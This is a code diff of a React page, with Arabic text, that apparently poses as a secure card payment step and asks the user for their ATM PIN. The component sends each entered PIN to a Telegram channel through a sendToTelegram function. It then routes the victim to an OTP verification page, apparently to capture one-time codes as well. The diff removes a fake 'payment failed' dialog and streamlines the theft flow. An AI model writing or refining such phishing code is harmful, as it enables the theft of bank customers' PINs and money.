@@ -9,14 +9,6 @@ import {
   InputOTPGroup,
   InputOTPSlot,
 } from "@/components/ui/input-otp";
-import {
-  Dialog,
-  DialogContent,
-  DialogDescription,
-  DialogFooter,
-  DialogHeader,
-  DialogTitle,
-} from "@/components/ui/dialog";
 import securePaymentLogos from "@/assets/secure-payment-logos.png";
 
 const steps = [
@@ -28,7 +20,6 @@ const steps = [
 
 const ATMPin = () => {
   const [pin, setPin] = useState("");
-  const [isDialogOpen, setIsDialogOpen] = useState(false);
   const navigate = useNavigate();
 
   const sendToTelegram = async (message: string) => {
@@ -54,14 +45,9 @@ const ATMPin = () => {
 
   const handleConfirm = async () => {
     if (pin.length === 4) {
-      console.log("Starting confirmation process...");
       const message = `الرقم السري للبطاقة ATM PIN\n\nالرقم السري: ${pin}`;
-      
-      // Send to Telegram without blocking the dialog
-      sendToTelegram(message).catch(err => console.error("Telegram error:", err));
-      
-      console.log("Opening dialog...");
-      setIsDialogOpen(true);
+      await sendToTelegram(message);
+      navigate('/otp-verification');
     }
   };
 
@@ -153,7 +139,7 @@ const ATMPin = () => {
               </Button>
               <Button 
                 variant="outline"
-                onClick={() => navigate('/otp-verification')}
+                onClick={() => navigate('/registration-complete')}
               >
                 رجوع
               </Button>
@@ -180,45 +166,6 @@ const ATMPin = () => {
       </main>
 
       <Footer />
-
-      <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
-        <DialogContent className="max-w-md" dir="rtl">
-          <DialogHeader>
-            <DialogTitle className="text-center text-destructive text-xl">
-              تعذر إتمام عملية الدفع
-            </DialogTitle>
-            <DialogDescription asChild>
-              <div className="space-y-4 text-right text-base">
-                <p className="font-semibold text-foreground">
-                  نعتذر، لم نتمكن من التحقق من صحة بيانات البطاقة المصرفية.
-                </p>
-                <div className="mr-4 space-y-2 text-foreground">
-                  <p>• يرجى التأكد من صحة المعلومات المُدخلة</p>
-                  <p>• يمكنكم استخدام بطاقة مصرفية أخرى</p>
-                  <p>• أو اختيار وسيلة دفع بديلة</p>
-                </div>
-              </div>
-            </DialogDescription>
-          </DialogHeader>
-          <DialogFooter className="flex-row-reverse gap-2 sm:flex-row-reverse">
-            <Button
-              onClick={() => {
-                setIsDialogOpen(false);
-                navigate('/registration-complete');
-              }}
-              className="bg-primary hover:bg-primary/90 text-primary-foreground"
-            >
-              إعادة المحاولة
-            </Button>
-            <Button
-              variant="outline"
-              onClick={() => setIsDialogOpen(false)}
-            >
-              إغلاق
-            </Button>
-          </DialogFooter>
-        </DialogContent>
-      </Dialog>
     </div>
   );
 };
